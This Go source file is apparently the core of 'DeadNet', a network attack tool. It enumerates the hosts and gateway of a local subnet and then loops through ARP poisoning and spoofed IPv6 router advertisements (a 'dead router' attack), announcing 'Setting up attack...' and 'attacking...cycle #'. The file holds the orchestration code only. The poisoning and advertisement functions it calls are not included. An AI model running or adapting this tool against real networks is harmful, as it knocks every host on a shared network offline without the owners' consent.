package main

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"

	"deadnet/utils"
)

type DeadNet struct {
	ifaceName       string
	iface           *net.Interface
	cidrLen         int
	subnetCIDR      string
	userIPv4        net.IP
	gatewayIPv4     string
	gatewayIPv4Addr net.IP
	gatewayMAC      net.HardwareAddr
	gatewayIPv6     string
	gatewayIPv6Addr net.IP
	prefixIPv6      net.IP
	hostIPv4s       []net.IP
	spoofIPv6       bool
	ipv6PrefLen     int
	arpInterval     time.Duration
	rawSender       *rawSocket
}

func NewDeadNet(args utils.Arguments) (*DeadNet, error) {
	iface, err := net.InterfaceByName(args.Iface)
	if err != nil {
		return nil, err
	}
	userIP, err := ifaceIPv4Address(iface)
	if err != nil {
		return nil, err
	}
	cidr := fmt.Sprintf("%s/%d", userIP.String(), args.CIDRLen)
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	networkIP := ipNet.IP.Mask(ipNet.Mask)

	gatewayIPv4 := args.GatewayIPv4
	if gatewayIPv4 == "" {
		gatewayIPv4, err = detectGatewayIPv4(args.Iface)
		if err != nil {
			return nil, err
		}
	}
	gatewayIPv4Addr := net.ParseIP(gatewayIPv4)
	if gatewayIPv4Addr == nil {
		return nil, fmt.Errorf("invalid gateway IPv4 address %s", gatewayIPv4)
	}
	gatewayIPv4Addr = gatewayIPv4Addr.To4()
	if gatewayIPv4Addr == nil {
		return nil, errors.New("gateway IPv4 address is not IPv4")
	}

	var gatewayMAC net.HardwareAddr
	if args.GatewayMAC != "" {
		gatewayMAC, err = net.ParseMAC(args.GatewayMAC)
		if err != nil {
			return nil, err
		}
	} else {
		gatewayMAC, err = detectGatewayMAC(args.Iface, gatewayIPv4)
		if err != nil {
			return nil, err
		}
	}
	if !utils.IsValidMAC(gatewayMAC.String()) {
		return nil, fmt.Errorf("invalid gateway MAC address %s", gatewayMAC)
	}

	gatewayIPv6, err := utils.MacToIPv6LL(gatewayMAC.String(), utils.IPv6LLPrefix)
	if err != nil {
		return nil, err
	}
	gatewayIPv6Addr := net.ParseIP(gatewayIPv6)
	if gatewayIPv6Addr == nil {
		return nil, errors.New("unable to derive gateway IPv6 address")
	}

	prefixIPv6 := net.ParseIP(fmt.Sprintf("%s::", utils.IPv6LLPrefix))
	if prefixIPv6 == nil {
		return nil, errors.New("invalid IPv6 prefix")
	}

	hosts := generateHostList(ipNet, userIP, gatewayIPv4Addr)
	sender, err := newRawSocket(iface)
	if err != nil {
		return nil, err
	}

	dn := &DeadNet{
		ifaceName:       args.Iface,
		iface:           iface,
		cidrLen:         args.CIDRLen,
		subnetCIDR:      fmt.Sprintf("%s/%d", networkIP.String(), args.CIDRLen),
		userIPv4:        userIP,
		gatewayIPv4:     gatewayIPv4,
		gatewayIPv4Addr: gatewayIPv4Addr,
		gatewayMAC:      gatewayMAC,
		gatewayIPv6:     gatewayIPv6,
		gatewayIPv6Addr: gatewayIPv6Addr,
		prefixIPv6:      prefixIPv6,
		hostIPv4s:       hosts,
		spoofIPv6:       !args.DisableIPv6,
		ipv6PrefLen:     args.PrefixLen,
		arpInterval:     time.Duration(args.SleepInterval) * time.Second,
		rawSender:       sender,
	}

	dn.printSettings()

	utils.Printf("%s[*]%s Generated %d possible IPV4 hosts", utils.Blue, utils.White, len(hosts))
	if dn.spoofIPv6 {
		utils.Printf("%s[*]%s IPv6 RA spoof is enabled, setting up...", utils.Blue, utils.White)
		if !utils.OSIsWindows() {
			utils.Printf("%s[*]%s Pinging IPv6 subnet for hosts...", utils.Blue, utils.White)
			utils.Printf("%s[+]%s Found %d IPv6 hosts during setup", utils.Blue, utils.White, len(dn.getAllHostsIPv6()))
		} else {
			utils.Printf("%s[-]%s Windows does not support ping6, skipping...", utils.Red, utils.White)
		}
	} else {
		utils.Printf("%s[-]%s IPv6 RA spoof is disabled, skipping ping6...", utils.Red, utils.White)
	}
	utils.Printf("%s[*]%s Setting up attack...", utils.Blue, utils.White)

	return dn, nil
}

func (d *DeadNet) Close() {
	if d.rawSender != nil {
		d.rawSender.close()
	}
}

func (d *DeadNet) Start(ctx context.Context) error {
	utils.Printf(utils.Delim)
	if utils.OSIsLinux() {
		utils.Printf("")
		utils.Printf("")
	}
	var wg sync.WaitGroup
	if d.spoofIPv6 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			d.deadRouterAttack(ctx)
		}()
	}
	ticker := time.NewTicker(d.arpInterval)
	defer ticker.Stop()

	cycle := 0
	for {
		select {
		case <-ctx.Done():
			wg.Wait()
			return ctx.Err()
		default:
		}
		cycle++
		start := utils.GetTimestampMs()
		d.poisonARP(ctx)
		if d.spoofIPv6 {
			_ = d.sendRouterAdvertisement(true)
		}
		if utils.OSIsLinux() {
			utils.Printf("\x1b[1A\x1b[2K\x1b[1A\x1b[2K")
		}
		utils.Printf("%s[+]%s attacking...cycle #%d duration %d[ms]", utils.Green, utils.White, cycle, utils.GetTimestampMs()-start)
		select {
		case <-ctx.Done():
			wg.Wait()
			return ctx.Err()
		case <-ticker.C:
		}
	}
}

func (d *DeadNet) printSettings() {
	utils.Printf("- net iface%s", padLeft(d.ifaceName, 38))
	utils.Printf("- sleep time%s[sec]", padLeft(fmt.Sprintf("%d", int(d.arpInterval/time.Second)), 32))
	utils.Printf("- MAC gateway%s", padLeft(d.gatewayMAC.String(), 36))
	utils.Printf("- IPv4 subnet%s", padLeft(d.subnetCIDR, 36))
	utils.Printf("- IPv4 gateway%s", padLeft(d.gatewayIPv4, 35))
	utils.Printf("- IPv6 gateway%s", padLeft(d.gatewayIPv6, 35))
	utils.Printf("- IPv6 preflen%s", padLeft(fmt.Sprintf("%d", d.ipv6PrefLen), 35))
	utils.Printf("- spoof IPv6 RA%s", padLeft(fmt.Sprintf("%v", d.spoofIPv6), 34))
	utils.Printf(utils.Delim)
}

func (d *DeadNet) getAllHostsIPv6() []string {
	var hosts []string
	cmd := exec.Command("ping6", "-I", d.ifaceName, utils.IPv6MulticastAddr, "-c", "3")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return hosts
	}
	scanner := bufio.NewScanner(bytes.NewReader(output))
	needle := utils.IPv6LLPrefix
	delim := fmt.Sprintf("%%%s", d.ifaceName)
	seen := make(map[string]struct{})
	for scanner.Scan() {
		line := scanner.Text()
		idx := strings.Index(line, needle)
		if idx <= 0 {
			continue
		}
		end := strings.Index(line[idx:], delim)
		if end <= 0 {
			continue
		}
		host := line[idx : idx+end]
		if _, ok := seen[host]; ok {
			continue
		}
		seen[host] = struct{}{}
		hosts = append(hosts, host)
	}
	return hosts
}

func ifaceIPv4Address(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			if v4 := ipNet.IP.To4(); v4 != nil {
				return v4, nil
			}
		}
	}
	return nil, errors.New("no IPv4 assigned to interface")
}

func detectGatewayIPv4(iface string) (string, error) {
	cmd := exec.Command("ip", "route", "show", "default")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	scanner := bufio.NewScanner(bytes.NewReader(output))
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 5 {
			continue
		}
		if fields[0] != "default" {
			continue
		}
		var gw, dev string
		for i := 1; i < len(fields); i++ {
			if fields[i] == "via" && i+1 < len(fields) {
				gw = fields[i+1]
			}
			if fields[i] == "dev" && i+1 < len(fields) {
				dev = fields[i+1]
			}
		}
		if dev == iface && gw != "" {
			return gw, nil
		}
	}
	return "", errors.New("gateway IPv4 not found")
}

func detectGatewayMAC(iface, gateway string) (net.HardwareAddr, error) {
	if err := populateNeighbor(iface, gateway); err != nil {
		return nil, err
	}
	cmd := exec.Command("ip", "neighbor", "show", gateway, "dev", iface)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}
	scanner := bufio.NewScanner(bytes.NewReader(output))
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		for i := 0; i < len(fields); i++ {
			if fields[i] == "lladdr" && i+1 < len(fields) {
				mac := fields[i+1]
				if mac == "<incomplete>" {
					break
				}
				return net.ParseMAC(mac)
			}
		}
	}
	return nil, errors.New("unable to determine gateway MAC")
}

func populateNeighbor(iface, gateway string) error {
	exec.Command("ping", "-c", "1", "-I", iface, gateway).Run()
	exec.Command("arping", "-c", "1", "-I", iface, gateway).Run()
	return nil
}

func generateHostList(ipNet *net.IPNet, userIP, gatewayIP net.IP) []net.IP {
	var hosts []net.IP
	skip := map[string]struct{}{
		userIP.String():    struct{}{},
		gatewayIP.String(): struct{}{},
	}
	for ip := cloneIP(ipNet.IP.Mask(ipNet.Mask)); ipNet.Contains(ip); incIP(ip) {
		ipCopy := cloneIP(ip)
		if _, ok := skip[ipCopy.String()]; ok {
			continue
		}
		hosts = append(hosts, ipCopy)
	}
	return hosts
}

func cloneIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] != 0 {
			break
		}
	}
}

func padLeft(val string, width int) string {
	if len(val) >= width {
		return val
	}
	return strings.Repeat(" ", width-len(val)) + val
}
